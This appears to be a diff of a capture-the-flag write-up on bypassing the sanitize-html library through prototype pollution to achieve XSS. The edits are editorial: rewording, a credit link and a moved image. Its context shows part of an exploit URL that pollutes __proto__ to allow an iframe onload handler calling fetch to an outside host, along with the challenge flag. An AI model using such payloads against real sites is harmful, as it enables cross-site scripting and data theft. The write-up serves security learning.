@@ -229,12 +229,14 @@ sanitizeHtml.defaults = {
 };
 ```
 
-A few things stand out:
+Few things stand out:
 
 * `<iframe>` is allowed (this is often a bad sign).
 * Only specific attributes are permitted (`href`, `src`, etc.), and they're tightly scoped.
 
-But here’s the thing — if we can sneak in an unexpected attribute like `onload`, especially on an iframe, it’s game over. Time to trace how `allowedAttributes` is processed internally.
+But here’s the thing, if we can sneak in an unexpected attribute like `onload`, especially on an iframe, it’s game over. Time to trace how `allowedAttributes` is processed internally.
+
+> Special thanks to [Securitum Research](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) for uncovering such use for prototype pollution with HTML sanitizers
 
 ### Finding the Sink
 
@@ -312,9 +314,10 @@ http://127.0.0.1:5000/?__proto__[*]=['onload']&note=<iframe onload="fetch('https
 
 And just like that, XSS is achieved.
 
+![Primeagen](https://media1.tenor.com/m/hYU0XdvEzmAAAAAC/theprimeagen-primeagen.gif)
+
 Flag is: `L3AK{v1b3_c0d1n9_w3nt_t00_d33p_4nd_3nd3d_1n_xss}`
 
-![Primeagen](https://media1.tenor.com/m/hYU0XdvEzmAAAAAC/theprimeagen-primeagen.gif)
 
 ## Conclusions
 
